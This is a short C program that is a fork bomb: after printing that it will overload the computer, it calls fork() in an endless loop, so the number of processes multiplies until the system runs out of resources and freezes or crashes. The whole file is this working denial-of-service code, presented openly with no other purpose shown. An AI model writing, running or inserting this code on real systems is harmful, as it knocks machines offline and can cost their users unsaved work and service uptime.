#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

void main(void) {
        printf("This is a program that will overload your computer\n");
        while (true) {
                printf("forking \n");
                fork();
        }
}
